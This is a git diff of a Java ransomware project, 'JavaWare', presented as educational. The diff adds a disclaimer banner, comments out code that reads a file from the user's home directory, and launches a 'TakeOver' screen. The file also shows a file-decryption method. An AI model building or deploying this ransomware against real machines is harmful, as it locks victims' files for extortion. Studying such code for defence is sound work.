@@ -1,4 +1,26 @@
+/********************************************************************
+    _____                        _        _
+   |_   _|                      | |      | |
+     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
+     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
+  _ _/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
+  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|
+
+
+ Copyright (c) 2019 Kyra Mozley
+ Created on 18/07/19
+ Version 1.0
+
+ Disclaimer: This project is purely for educational purposes
+ DO NOT RUN THIS ON YOUR PERSONAL MACHINE
+ EXECUTE ONLY IN A TEST ENVIRONMENT
+ DO NOT USE FOR MALICIOUS ACTIVITY
+
+ *********************************************************************/
+
 package RansomeWare;
+
+import javafx.application.Application;
 
 import java.io.BufferedReader;
 import java.io.File;
@@ -22,7 +44,7 @@ public class JavaWare {
         System.out.println(ff.count);
 
 
-
+        /*
         BufferedReader reader = new BufferedReader(new FileReader(System.getProperty("user.home") + File.separator + "output.txt"));
         String line = reader.readLine();
         while(line != null) {
@@ -33,7 +55,8 @@ public class JavaWare {
             //read next line
             line = reader.readLine();
         }
-        reader.close();
+        reader.close();*/
+        Application.launch(TakeOver.class, "JavaWare");
     }
 
     public void DecryptFiles() throws Exception {
